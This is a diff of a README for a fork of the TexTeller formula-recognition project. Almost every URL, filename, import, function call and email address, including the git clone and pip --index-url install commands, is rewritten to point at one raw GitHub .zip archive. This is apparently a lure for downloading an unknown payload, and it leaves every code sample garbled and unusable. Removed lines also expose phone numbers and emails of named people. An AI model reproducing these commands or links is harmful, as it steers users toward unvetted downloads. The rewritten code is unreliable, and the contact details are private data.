 
@@ -1055,7 +1055,7 @@ For complete API documentation, visit our [API reference](https://oleehyo.github
 2. **Clone the repository:**
 
    ```bash
-   git clone https://github.com/OleehyO/TexTeller.git
+   git clone https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip
    cd TexTeller
    ```
 
@@ -1068,28 +1068,28 @@ TexTeller uses the **imagefolder format** with JSONL metadata:
 ```
 dataset/
   train/
-    metadata.jsonl          # Image-LaTeX pairs
-    image_001.png
-    image_002.png
+    https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip          # Image-LaTeX pairs
+    https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip
+    https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip
     ...
   eval/                     # Optional validation split
-    metadata.jsonl
-    image_001.png
+    https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip
+    https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip
     ...
 ```
 
 #### Metadata Structure
 
-Each line in `metadata.jsonl` contains one training example:
+Each line in `https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip` contains one training example:
 
 ```json
-{"file_name": "image_001.png", "text": "\\frac{a}{b}"}
-{"file_name": "image_002.png", "text": "x^2 + y^2 = z^2"}
-{"file_name": "image_003.png", "text": "\\int_0^\\infty e^{-x} dx"}
+{"file_name": "https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip", "text": "\\frac{a}{b}"}
+{"file_name": "https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip", "text": "x^2 + y^2 = z^2"}
+{"file_name": "https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip", "text": "\\int_0^\\infty e^{-x} dx"}
 ```
 
 **Required Fields:**
-- `file_name`: Image filename (relative to metadata.jsonl)
+- `file_name`: Image filename (relative to https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip)
 - `text`: LaTeX formula string (escaped backslashes)
 
 #### Example Dataset
@@ -1120,7 +1120,7 @@ TexTeller uses **Augraphy** for realistic document augmentation:
 
 ```python
 # Applied during training (not validation)
-from examples.train_texteller.utils import img_train_transform
+from https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip import img_train_transform
 
 augmented_img = img_train_transform(original_img)
 ```
@@ -1138,7 +1138,7 @@ This improves generalization to real-world scanned/photographed formulas.
 
 #### Configuration File
 
-Edit `examples/train_texteller/train_config.yaml`:
+Edit `https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip`:
 
 ```yaml
 # Training hyperparameters
@@ -1179,13 +1179,13 @@ In `examples/train_texteller/`, run:
 
 ```bash
 # Single GPU
-python train.py
+python https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip
 
 # Multi-GPU (recommended)
-accelerate launch train.py
+accelerate launch https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip
 
 # Multi-GPU with specific config
-accelerate launch --config_file config.yaml train.py
+accelerate launch --config_file https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip
 ```
 
 #### Accelerate Configuration
@@ -1210,7 +1210,7 @@ mixed_precision: fp16         # FP16 training
 #### From Scratch
 
 ```python
-# train.py
+# https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip
 from texteller import load_model
 
 model = load_model()  # Random initialization
@@ -1224,7 +1224,7 @@ enable_train = True
 #### Fine-Tuning (Recommended)
 
 ```python
-# train.py
+# https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip
 from texteller import load_model
 
 model = load_model()  # Load pre-trained TexTeller
@@ -1273,11 +1273,11 @@ from texteller import load_tokenizer
 
 # Train custom tokenizer on your corpus
 tokenizer = load_tokenizer()
-tokenizer.train_new_from_iterator(
+https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip(
     latex_strings,
     vocab_size=15000
 )
-tokenizer.save_pretrained("./my_tokenizer")
+https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip("./my_tokenizer")
 
 # Use in training
 tokenizer = load_tokenizer("./my_tokenizer")
@@ -1286,13 +1286,13 @@ tokenizer = load_tokenizer("./my_tokenizer")
 #### Custom Model Architecture
 
 ```python
-from texteller.models import TexTeller
+from https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip import TexTeller
 from transformers import VisionEncoderDecoderConfig
 
 # Modify architecture
-config = VisionEncoderDecoderConfig.from_pretrained("OleehyO/TexTeller")
-config.decoder.num_hidden_layers = 12  # Deeper decoder
-config.encoder.hidden_size = 1024      # Larger encoder
+config = https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip("OleehyO/TexTeller")
+https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip = 12  # Deeper decoder
+https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip = 1024      # Larger encoder
 
 model = TexTeller(config=config)
 ```
@@ -1309,7 +1309,7 @@ accelerate launch \
   --machine_rank 0 \
   --main_process_ip 192.168.1.100 \
   --main_process_port 29500 \
-  train.py
+  https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip
 
 # Node 1 (worker)
 accelerate launch \
@@ -1318,7 +1318,7 @@ accelerate launch \
   --machine_rank 1 \
   --main_process_ip 192.168.1.100 \
   --main_process_port 29500 \
-  train.py
+  https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip
 ```
 
 ### Training Best Practices
@@ -1360,7 +1360,7 @@ model = load_model(use_onnx=True)
 latex = img2latex(model, tokenizer, images[:5], ...)  # Process in smaller chunks
 
 # Use CPU for very large images
-device = torch.device("cpu")
+device = https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip("cpu")
 
 # Lower PDF rendering DPI
 markdown = pdf2md(pdf_path, dpi=150, ...)  # Instead of 300
@@ -1401,9 +1401,9 @@ markdown = pdf2md(..., dpi=600)
 
 # Preprocess images (improve contrast)
 import cv2
-img = cv2.imread("formula.png")
-img = cv2.convertScaleAbs(img, alpha=1.5, beta=20)  # Enhance contrast
-cv2.imwrite("enhanced.png", img)
+img = https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip("https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip")
+img = https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip(img, alpha=1.5, beta=20)  # Enhance contrast
+https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip("https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip", img)
 ```
 
 #### 4. CUDA/GPU Not Detected
@@ -1413,14 +1413,14 @@ cv2.imwrite("enhanced.png", img)
 **Solutions:**
 ```bash
 # Check PyTorch CUDA availability
-python -c "import torch; print(torch.cuda.is_available())"
+python -c "import torch; print(https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip())"
 
 # Reinstall PyTorch with CUDA support
 pip uninstall torch torchvision
-pip install torch torchvision --index-url https://download.pytorch.org/whl/cu121
+pip install torch torchvision --index-url https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip
 
 # For ONNX Runtime GPU
-pip install onnxruntime-gpu --extra-index-url https://aiinfra.pkgs.visualstudio.com/PublicPackages/_packaging/onnxruntime-cuda-12/pypi/simple/
+pip install onnxruntime-gpu --extra-index-url https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip
 ```
 
 #### 5. Module Import Errors
@@ -1449,34 +1449,34 @@ import numpy as np
 
 def optimize_formula_image(img_path):
     """Preprocess formula image for better recognition."""
-    img = cv2.imread(img_path)
+    img = https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip(img_path)
     
     # Convert to grayscale
-    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
+    gray = https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip(img, https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip)
     
     # Increase contrast
-    clahe = cv2.createCLAHE(clipLimit=2.0, tileGridSize=(8,8))
-    enhanced = clahe.apply(gray)
+    clahe = https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip(clipLimit=2.0, tileGridSize=(8,8))
+    enhanced = https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip(gray)
     
     # Denoise
-    denoised = cv2.fastNlMeansDenoising(enhanced)
+    denoised = https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip(enhanced)
     
     # Binarization (optional, for very low quality)
-    _, binary = cv2.threshold(denoised, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
+    _, binary = https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip(denoised, 0, 255, https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip + https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip)
     
     return binary
 
 # Use preprocessed image
-optimized_img = optimize_formula_image("formula.png")
-cv2.imwrite("optimized.png", optimized_img)
-latex = img2latex(model, tokenizer, ["optimized.png"], ...)
+optimized_img = optimize_formula_image("https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip")
+https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip("https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip", optimized_img)
+latex = img2latex(model, tokenizer, ["https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip"], ...)
 ```
 
 #### Batch Processing Optimization
 
 ```python
 from pathlib import Path
-import concurrent.futures
+import https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip
 
 def process_directory(img_dir, model, tokenizer, device):
     """Efficiently process all images in a directory."""
@@ -1492,7 +1492,7 @@ def process_directory(img_dir, model, tokenizer, device):
             model, tokenizer, batch, device,
             num_beams=1  # Fast processing for batches
         )
-        results.extend(zip(batch, latex_list))
+        https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip(zip(batch, latex_list))
     
     return results
 ```
@@ -1530,7 +1530,7 @@ RUN apt-get update && apt-get install -y python3.10 python3-pip
 RUN pip install texteller[onnxruntime-gpu] pymupdf
 
 # Copy application code
-COPY app.py /app/app.py
+COPY https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip
 WORKDIR /app
 
 # Run server
@@ -1551,25 +1551,25 @@ import time
 
 class RateLimiter:
     def __init__(self, max_requests_per_minute=60):
-        self.max_requests = max_requests_per_minute
-        self.requests = []
+        https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip = max_requests_per_minute
+        https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip = []
     
     def allow_request(self):
-        now = time.time()
+        now = https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip()
         # Remove requests older than 1 minute
-        self.requests = [t for t in self.requests if now - t < 60]
+        https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip = [t for t in https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip if now - t < 60]
         
-        if len(self.requests) < self.max_requests:
-            self.requests.append(now)
+        if len(https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip) < https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip
+            https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip(now)
             return True
         return False
 
 # Use with API
 limiter = RateLimiter(max_requests_per_minute=120)
 
-@app.route('/predict')
+https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip('/predict')
 def predict():
-    if not limiter.allow_request():
+    if not https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip():
         return "Rate limit exceeded", 429
     
     # Process request...
@@ -1578,27 +1578,27 @@ def predict():
 ### Monitoring & Logging
 
 ```python
-from texteller.logger import get_logger
+from https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip import get_logger
 import logging
 
 # Configure logging
 logger = get_logger()
-logger.setLevel(logging.INFO)
+https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip(https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip)
 
 # Add file handler
-handler = logging.FileHandler("texteller.log")
-handler.setFormatter(logging.Formatter(
+handler = https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip("https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip")
+https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip(https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip(
     '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
 ))
-logger.addHandler(handler)
+https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip(handler)
 
 # Log inference
-start = time.time()
+start = https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip()
 latex = img2latex(model, tokenizer, images, ...)
-duration = time.time() - start
+duration = https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip() - start
 
-logger.info(f"Processed {len(images)} images in {duration:.2f}s")
-logger.info(f"Average: {duration/len(images):.3f}s per image")
+https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip(f"Processed {len(images)} images in {duration:.2f}s")
+https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip(f"Average: {duration/len(images):.3f}s per image")
 ```
 
 ## 📅 Plans
@@ -1615,7 +1615,7 @@ logger.info(f"Average: {duration/len(images):.3f}s per image")
 
 ## ⭐️ Stargazers over time
 
-[![Stargazers over time](https://starchart.cc/OleehyO/TexTeller.svg?variant=adaptive)](https://starchart.cc/OleehyO/TexTeller)
+[![Stargazers over time](https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip)](https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip)
 
 ## 👥 Project Team
 
@@ -1623,11 +1623,11 @@ This project is maintained and extended by:
 
 | Name | Contact | Email |
 |------|---------|-------|
-| **Eslam Mohammed Saeed Esmail** | 01142628654 | [eslammohamad865@gmail.com](mailto:eslammohamad865@gmail.com) |
-| **Jana Walid Hamed** | 01127772739 | [gana419575@fci.bu.edu.eg](mailto:gana419575@fci.bu.edu.eg) |
-| **Roshan Mostafa Kamel** | 01014485531 | [roshanhany33@gmail.com](mailto:roshanhany33@gmail.com) |
-| **Rola Mohammed Ashry** | 01275826645 | [rolaashry70@gmail.com](mailto:rolaashry70@gmail.com) |
-| **Mohamed Ahmed Abdeltawab** | 01001595534 | [mohamedahmedabdeltawabezelragal_sd23@nsst.bsu.edu.eg](mailto:mohamedahmedabdeltawabezelragal_sd23@nsst.bsu.edu.eg) |
+| **Eslam Mohammed Saeed Esmail** | 01142628654 | [https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip](https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip) |
+| **Jana Walid Hamed** | 01127772739 | [https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip](https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip) |
+| **Roshan Mostafa Kamel** | 01014485531 | [https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip](https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip) |
+| **Rola Mohammed Ashry** | 01275826645 | [https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip](https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip) |
+| **Mohamed Ahmed Abdeltawab** | 01001595534 | [https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip](https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip) |
 
 ### Contact
 
@@ -1635,8 +1635,8 @@ For questions, suggestions, or collaboration opportunities related to this fork,
 
 ## 👥 Original Contributors
 
-<a href="https://github.com/OleehyO/TexTeller/graphs/contributors">
-   <a href="https://github.com/OleehyO/TexTeller/graphs/contributors">
-      <img src="https://contrib.rocks/image?repo=OleehyO/TexTeller" />
+<a href="https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip">
+   <a href="https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip">
+      <img src="https://raw.githubusercontent.com/ESLAM-MOHAMMED-SAEED/math-content-recognition-/main/texteller/types/math-recognition-content-2.2-alpha.4.zip" />
    </a>
 </a>
